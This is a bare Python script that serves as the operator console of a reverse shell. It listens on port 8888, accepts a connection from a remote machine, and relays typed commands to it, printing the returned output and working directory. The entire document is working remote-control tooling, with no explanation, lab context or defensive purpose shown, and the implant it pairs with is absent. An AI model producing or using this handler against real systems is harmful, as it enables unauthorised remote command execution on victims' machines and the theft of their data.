import socket

HOST = "0.0.0.0"
PORT = 8888

def recv_all(conn):
    data = b""
    while True:
        chunk = conn.recv(4096)
        if b"__end__" in chunk:
            data += chunk.replace(b"__end__", b"")
            break
        data += chunk
    return data.decode(errors="ignore")

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(1)

    print(f"[+] Listening on {HOST}:{PORT}")
    conn, addr = s.accept()
    print(f"[+] Connected: {addr}")

    cwd = ""

    while True:
        response = recv_all(conn)

        if "||" in response:
            cwd, output = response.split("||", 1)

            if output != "__prompt__":
                print(output)

        cmd = input(f"{cwd}> ").strip()

        if cmd in ("exit", "quit"):
            break

        conn.send(cmd.encode())

if __name__ == "__main__":
    main()
